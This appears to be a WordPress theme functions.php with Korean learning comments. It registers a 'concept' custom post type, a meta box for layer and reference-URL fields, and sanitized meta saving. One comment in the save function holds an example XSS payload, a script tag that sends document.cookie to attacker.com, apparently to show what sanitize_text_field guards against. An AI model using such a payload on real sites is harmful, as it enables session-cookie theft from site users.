<?php

// ※ Hook types
// 1. init
// 2. wp_enqueue_scripts = register CSS, JS
// 3. add_meta_boxes
// 4. save_post_{slug} = save the meta data together with the post to separate table

// Enqueue styles
function original_enqueue_styles() {
    wp_enqueue_style( // 현재 요청에서 사용할 CSS 파일을 스타일 관리 시스템에 등록.
        'original-style', // WordPress가 이 CSS 파일을 관리할 때 사용하는 이름.
        get_template_directory_uri() . '/css/style.css',
        // 1. 현재 테마 폴더의 URL을 반환.
        // 2. get_stylesheet_uri() = 현재 활성화된 테마 폴더 안의 style.css 파일 URL 반환.
        array(), // 이 CSS보다 먼저 로드되어야 하는 CSS의 이름 목록.
        filemtime(get_stylesheet_directory() . '/style.css')
        // CSS 수정 시 브라우저가 새 파일을 받게 함.
    );
}
add_action('wp_enqueue_scripts', 'original_enqueue_styles');
// wp_enqueue_scripts = WordPress가 내부에서 CSS/JS 등록하는 단계
// ※ wp_enqueue_scripts는 page를 렌더링 할 때 항상 거친다.

// Register custom post type
function register_concept_cpt() {
    register_post_type('concept', array( // custom post type 등록.
        'labels' => array( // 관리자 화면에 표시될 텍스트 설정.
            'name' => 'Concepts', // 복수형 표시 이름.
            'singular_name' => 'Concept', // 단수형 표시 이름.
            // ※ 기본 문자열이 “조합형으로 만들어지는 label”에만 영향(고정 문자열X).
            'add_new_item' => 'Add Concept', // 대표적인 고정 문자열.
        ),
        'public' => true, // 외부 공개 여부.
        'rewrite' => array('slug' => 'concept'), // CPT single rewrite(permastruct slug).
        'has_archive' => true, // CPT acrhive rewrite.
        'supports' => array('title', 'editor', 'thumbnail', 'excerpt'), // 입력창 구조.
        'menu_position' => 5, // 관리자 메뉴에 위치할 순서.
        'menu_icon' => 'dashicons-lightbulb' // concept 표시 아이콘.
    ));
}
add_action('init', 'register_concept_cpt');

function theme_setup() {
    add_theme_support('post-thumbnails');
}
add_action('after_setup_theme', 'theme_setup');

// HTML for meta box
function render_concept_meta_box($post) {
    ?>
    <p>
        <label for="layer">Layer</label>
        <select name="concept_layer" id="layer">
            <option value="entity">Entity</option>
            <option value="usecase">Use Case</option>
            <option value="interface">Interface Adapter</option>
        </select>
    </p>

    <p>
        <label for="concept_ref_url">Reference URL</label><br>
        <input type="url" id="concept_ref_url" name="concept_ref_url" style="width:100%;">
    </p>
    <?php
}

// Register meta box
function add_concept_meta_box() {
    add_meta_box(
        'concept_meta_box', // box ID (unique identifier for this meta box)
        'Concept Fields', // box title (this is shown in the meta box)
        'render_concept_meta_box', // callback (a function that outputs the HTML)
        'concept', // for a post_type (must match the post type you registered)
        'normal', // context (position in the post edit screen)
        'default' // priority (order within the context area)
    );
}
add_action('add_meta_boxes', 'add_concept_meta_box');

//
function save_concept_meta($post_id) {
    
    // 자동 저장될 때 meta data 저장 방지, 의도치 않은 데이터가 저장될 수 있음.
    if(defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
        return;
    }

    // 로그인된 사용자 정보로 권한 확인.
    if(!current_user_can('edit_post', $post_id)) {
        // capability (edit_post, delete_post, publish_posts, edit_posts)
        return;
    }

    // 값 존재 확인 후 저장
    if(isset($_POST['concept_layer'])) {
        update_post_meta( // add or update post meta data in wp_postmeta table
            $post_id,
            'concept_layer', // meta_key에 들어갈 data (input name과 일치시키는 게 편하다)
            sanitize_text_field($_POST['concept_layer']) 
            // 문자열 정리 (HTML 태그나 공백 제거 등..) 
            // <script>document.location='http://attacker.com?cookie='+document.cookie;</script>
        );
    }

    if(isset($_POST['concept_ref_url'])) {
        update_post_meta(
            $post_id,
            'concept_ref_url',
            esc_url_raw($_POST['concept_ref_url'])
        );
    }
}
add_action('save_post_concept', 'save_concept_meta');


